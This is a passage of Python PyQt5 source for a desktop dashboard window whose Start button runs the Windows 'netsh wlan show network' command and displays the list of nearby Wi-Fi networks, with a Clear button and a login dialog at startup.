        self.resize(812, 632)  
        self.setStyleSheet("#Dashboard{background-color: rgb(0, 170, 255);}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")

        
        self.clearButton = QtWidgets.QPushButton(self.frame)
        self.clearButton.setGeometry(QtCore.QRect(330, 460, 91, 31))
        self.clearButton.setFont(font)
        self.clearButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.clearButton.setObjectName("clearButton")
        self.clearButton.clicked.connect(self.clearOutput)
        


        '''
        self.resultTextEdit = QtWidgets.QPlainTextEdit(self.frame)
        self.resultTextEdit.setGeometry(QtCore.QRect(30, 230, 421, 311))
        self.resultTextEdit.setObjectName("resultTextEdit")

        '''

        self.resultTextBrowser = QtWidgets.QTextBrowser(self.frame)
        self.resultTextBrowser.setGeometry(QtCore.QRect(30, 135, 600, 311))        
        self.resultTextBrowser.setFontPointSize(10)
        self.resultTextBrowser.setFontWeight(6)
        self.resultTextBrowser.setObjectName("resultTextBrowser")
        self.resultTextBrowser.setOpenExternalLinks(True)

        

        self.startButton = QtWidgets.QPushButton(self.frame)
        self.startButton.setGeometry(QtCore.QRect(190, 460, 91, 31))
        self.startButton.setFont(font)
        self.startButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.startButton.setObjectName("startButton")
        self.startButton.clicked.connect(self.manipulateUi)


        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.startButton.setText(_translate("MainWindow", "Start"))
        self.clearButton.setText(_translate("MainWindow", "Clear"))


    def get_wifi_list(self):

        results = subprocess.check_output(["netsh", "wlan", "show", "network"])
        try:
            #return(results)
            print('Try Happened')
            results = results.decode("ascii") # needed in python 3
        except UnicodeDecodeError as identifier:
            print("Except Happened")
            return ("Error Occured ! Try Again")
        
        return results

    def clearOutput(self):
        self.resultTextBrowser.clear()
        pass

    def manipulateUi(self):
        self.resultTextBrowser.setPlainText("This is a Plain Text")
        result_text = self.get_wifi_list()
        self.resultTextBrowser.setPlainText(result_text)
        


if __name__ == "__main__":  
    import sys  
    app = QtWidgets.QApplication(sys.argv)  
    Login = Ui_Login()  
    if Login.exec_() == QtWidgets.QDialog.Accepted:
        Dashboard = Dashboard()
        Dashboard.show()
        dbConn.close()
        sys.exit(app.exec_()) 